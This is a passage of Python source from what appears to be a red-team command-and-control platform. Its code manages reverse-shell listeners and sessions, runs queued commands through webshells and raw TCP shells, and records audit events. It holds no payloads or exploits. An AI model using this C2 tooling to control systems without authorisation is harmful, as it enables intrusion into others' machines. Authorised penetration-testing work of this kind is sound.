                            "endpoint": f"{endpoint}/execute",
                            "token": listener_secret.get("token", ""),
                        },
                        actor_type="system",
                        actor=f"listener:{listener['id']}",
                        parent_resource_id=listener["id"],
                        publish_fact=True,
                    )
                else:
                    conn.execute(
                        "UPDATE shared_resources SET status = 'available', metadata_json = ?, updated_at = ?, last_seen_at = ? WHERE id = ?",
                        (json_dump(session_metadata), now, now, row["id"]),
                    )
            existing = conn.execute(
                "SELECT id, target FROM shared_resources WHERE kind = 'c2_session' AND parent_resource_id = ?",
                (listener["id"],),
            ).fetchall()
            for row in existing:
                if row["target"] not in seen:
                    conn.execute(
                        "UPDATE shared_resources SET status = 'offline', updated_at = ? WHERE id = ?",
                        (now, row["id"]),
                    )

    def _attach_channel(
        self,
        listener: dict[str, Any],
        channel: socket.socket,
        peer: tuple[Any, ...],
        connection_type: str,
    ) -> None:
        channel.settimeout(0.2)
        host, port = str(peer[0]), int(peer[1])
        with db.get_conn() as conn:
            current_listener = conn.execute(
                "SELECT project_id, metadata_json FROM shared_resources WHERE id = ?",
                (listener["id"],),
            ).fetchone()
            resource_project_id = current_listener["project_id"] if current_listener is not None else None
            listener_metadata = json_load(
                current_listener["metadata_json"] if current_listener is not None else listener.get("metadata_json"),
                {},
            )
            source_project_id = resource_project_id or listener_metadata.get("source_project_id")
            session, _ = create_resource(
                conn,
                project_id=resource_project_id,
                kind="c2_session",
                name=f"{connection_type}:{host}:{port}",
                target=f"{host}:{port}",
                summary=f"{connection_type} raw TCP shell",
                status="available",
                metadata={
                    "connection_type": connection_type,
                    "shell_type": "raw_tcp",
                    "transport": "tcp",
                    "hostname": host,
                    "peer_port": port,
                    "capabilities": ["command"],
                    **({"source_project_id": source_project_id} if source_project_id else {}),
                },
                actor_type="system",
                actor=f"listener:{listener['id']}",
                parent_resource_id=listener["id"],
                publish_fact=True,
            )
            session_id = session["id"]
            audit_event(
                conn,
                project_id=resource_project_id,
                resource_id_value=session_id,
                task_id_value=None,
                actor_type="system",
                actor=f"listener:{listener['id']}",
                action="c2.session_online",
                status="succeeded",
                detail={"connection_type": connection_type, "peer": f"{host}:{port}"},
            )
        with self._lock:
            self._sessions[session_id] = channel
            self._session_listener[session_id] = listener["id"]
            self._session_locks[session_id] = threading.Lock()

    def _drop_session(self, session_id: str) -> None:
        with self._lock:
            channel = self._sessions.pop(session_id, None)
            self._session_listener.pop(session_id, None)
            self._session_locks.pop(session_id, None)
        if channel is not None:
            try:
                channel.close()
            except OSError:
                pass
        with db.get_conn() as conn:
            row = conn.execute("SELECT project_id FROM shared_resources WHERE id = ?", (session_id,)).fetchone()
            conn.execute(
                "UPDATE shared_resources SET status = 'offline', updated_at = ? WHERE id = ?",
                (utcnow(), session_id),
            )
            if row is not None:
                audit_event(
                    conn,
                    project_id=row["project_id"],
                    resource_id_value=session_id,
                    task_id_value=None,
                    actor_type="system",
                    actor="shell-broker",
                    action="c2.session_offline",
                    status="offline",
                )

    @staticmethod
    def _mark_listener(listener_id: str, status_value: str, error: str) -> None:
        with db.get_conn() as conn:
            row = conn.execute("SELECT project_id FROM shared_resources WHERE id = ?", (listener_id,)).fetchone()
            conn.execute(
                "UPDATE shared_resources SET status = ?, summary = ?, updated_at = ? WHERE id = ?",
                (status_value, error[:1000], utcnow(), listener_id),
            )
            if row is not None:
                audit_event(
                    conn,
                    project_id=row["project_id"],
                    resource_id_value=listener_id,
                    task_id_value=None,
                    actor_type="system",
                    actor="shell-broker",
                    action="c2.listener_error",
                    status=status_value,
                    detail={"error": error[:1000]},
                )


shell_broker = ShellBroker()


class OperationExecutor:
    def __init__(self) -> None:
        self._pool = ThreadPoolExecutor(max_workers=8, thread_name_prefix="redtrace-operation")
        self._submitted: set[str] = set()
        self._lock = threading.Lock()

    def submit(self, task_id_value: str) -> None:
        with self._lock:
            if task_id_value in self._submitted:
                return
            self._submitted.add(task_id_value)
        self._pool.submit(self._run, task_id_value)

    def cancel_project(self, project_id: str) -> None:
        now = utcnow()
        with db.get_conn() as conn:
            conn.execute(
                """
                UPDATE operation_tasks
                SET cancel_requested = 1,
                    status = CASE
                        WHEN status IN ('queued', 'running') THEN 'cancelled'
                        ELSE status
                    END,
                    completed_at = CASE
                        WHEN status IN ('queued', 'running') THEN ?
                        ELSE completed_at
                    END
                WHERE project_id = ?
                  AND status NOT IN ('succeeded', 'failed', 'cancelled', 'rejected')
                """,
                (now, project_id),
            )

    def has_project_tasks(self, project_id: str) -> bool:
        with self._lock:
            submitted = tuple(self._submitted)
        if not submitted:
            return False
        placeholders = ",".join("?" for _ in submitted)
        with db.get_conn() as conn:
            row = conn.execute(
                f"""
                SELECT 1
                FROM operation_tasks
                WHERE project_id = ? AND id IN ({placeholders})
                LIMIT 1
                """,
                (project_id, *submitted),
            ).fetchone()
        return row is not None

    def _run(self, task_id_value: str) -> None:
        try:
            self._run_inner(task_id_value)
        except Exception:
            LOG.exception("operation executor crashed task=%s", task_id_value)
        finally:
            with self._lock:
                self._submitted.discard(task_id_value)

    def _run_inner(self, task_id_value: str) -> None:
        with db.get_conn() as conn:
            task = conn.execute(
                "SELECT * FROM operation_tasks WHERE id = ?",
                (task_id_value,),
            ).fetchone()
            if task is None or task["status"] != "queued" or task["cancel_requested"]:
                return
            resource = conn.execute(
                "SELECT * FROM shared_resources WHERE id = ?",
                (task["resource_id"],),
            ).fetchone()
            if resource is None:
                return
            if resource["kind"] not in EXECUTABLE_KINDS | {"c2_session"}:
                self._finish_failure(conn, task, resource, "resource does not support operations")
                return
            now = utcnow()
            conn.execute(
                "UPDATE operation_tasks SET status = 'running', started_at = ? WHERE id = ?",
                (now, task_id_value),
            )
            audit_event(
                conn,
                project_id=task["project_id"],
                resource_id_value=task["resource_id"],
                task_id_value=task_id_value,
                actor_type=task["actor_type"],
                actor=task["actor"],
                action=f"operation.{task['action']}",
                status="running",
            )

        try:
            if resource["kind"] == "webshell":
                output = execute_webshell(resource, task)
            elif resource["kind"] == "c2_session":
                if shell_broker.has_session(resource["id"]):
                    arguments = json_load(task["input_json"], {})
                    output = shell_broker.execute(
                        resource["id"],
                        str(arguments.get("command") or ""),
                        float(arguments.get("timeout") or 20),
                    )
                else:
                    output = execute_direct_session(resource, task)
            else:
                output = execute_plugin(resource, task)
        except Exception as exc:
            with db.get_conn() as conn:
                current = conn.execute(
                    "SELECT * FROM operation_tasks WHERE id = ?",
                    (task_id_value,),
                ).fetchone()
                if current is not None and current["status"] not in TERMINAL_TASK_STATES:
                    self._finish_failure(conn, current, resource, str(exc))
            return

        with db.get_conn() as conn:
            current = conn.execute(
                "SELECT * FROM operation_tasks WHERE id = ?",
                (task_id_value,),
            ).fetchone()
            if current is None or current["status"] in {"cancelled", "rejected"}:
                return
            out_id, ref = store_result(conn, current["project_id"], task_id_value, output)
            summary = output_summary(output) or "任务已完成，未返回文本输出"
            conn.execute(
                """
                UPDATE operation_tasks
                SET status = 'succeeded', output_summary = ?, result_ref = ?, completed_at = ?
                WHERE id = ?
                """,
                (summary, ref, utcnow(), task_id_value),
            )
            conn.execute(
                "UPDATE shared_resources SET status = 'available', updated_at = ?, last_seen_at = ? WHERE id = ?",
                (utcnow(), utcnow(), current["resource_id"]),
            )
            arguments = json_load(current["input_json"], {})
            fact_id_value = None
            if bool(arguments.get("publish_result")):
                result_resource, _ = create_resource(
                    conn,
                    project_id=current["project_id"],
                    kind="result",
                    name=f"{resource['name']} · {current['action']}",
                    target=ref,
                    summary=summary,
                    metadata={"result_id": out_id, "task_id": task_id_value},
                    actor_type=current["actor_type"],
                    actor=current["actor"],
                    worker=current["actor"] if current["actor_type"] == "worker" else None,
                    intent_id=current["intent_id"],
                    source_task_id=task_id_value,
                    publish_fact=True,
                )
                fact_id_value = result_resource.get("fact_id")
            conn.execute(
                "UPDATE operation_tasks SET fact_id = COALESCE(?, fact_id) WHERE id = ?",
                (fact_id_value, task_id_value),
            )
            audit_event(
                conn,
                project_id=current["project_id"],
                resource_id_value=current["resource_id"],
                task_id_value=task_id_value,
                actor_type=current["actor_type"],
                actor=current["actor"],
                action=f"operation.{current['action']}",
                status="succeeded",
                detail={"result_ref": ref, "summary": summary},
            )

    @staticmethod
    def _finish_failure(conn, task: Any, resource: Any, message: str) -> None:
        summary = output_summary(message) or "operation failed"
        conn.execute(
            """
            UPDATE operation_tasks
            SET status = 'failed', output_summary = ?, completed_at = ?
            WHERE id = ?
            """,
            (summary, utcnow(), task["id"]),
        )
        conn.execute(
            "UPDATE shared_resources SET status = 'degraded', updated_at = ? WHERE id = ?",
            (utcnow(), resource["id"]),
        )
        audit_event(
            conn,
            project_id=task["project_id"],
            resource_id_value=task["resource_id"],
            task_id_value=task["id"],
            actor_type=task["actor_type"],
            actor=task["actor"],
            action=f"operation.{task['action']}",
            status="failed",
            detail={"error": summary},
        )


operation_executor = OperationExecutor()


def resume_pending_tasks() -> None:
    with db.get_conn() as conn:
        rows = conn.execute(
            """
            SELECT t.id, t.resource_id, r.kind, r.metadata_json
            FROM operation_tasks t
            JOIN shared_resources r ON r.id = t.resource_id
            WHERE t.status = 'queued'
              AND t.cancel_requested = 0
              AND r.kind IN ('webshell', 'plugin', 'c2_session')
            ORDER BY t.created_at
            """
        ).fetchall()
    for row in rows:
        metadata = json_load(row["metadata_json"], {})
        if row["kind"] != "c2_session" or str(metadata.get("connection_type") or "beacon").lower() in {
            "direct", "external_c2"
        } or shell_broker.has_session(row["resource_id"]):
            operation_executor.submit(row["id"])


def resume_c2_listeners() -> None:
    with db.get_conn() as conn:
        listeners = conn.execute(
            "SELECT * FROM shared_resources WHERE kind = 'c2_listener' AND status = 'available'"
        ).fetchall()
    for listener in listeners:
        shell_broker.start_listener(listener)
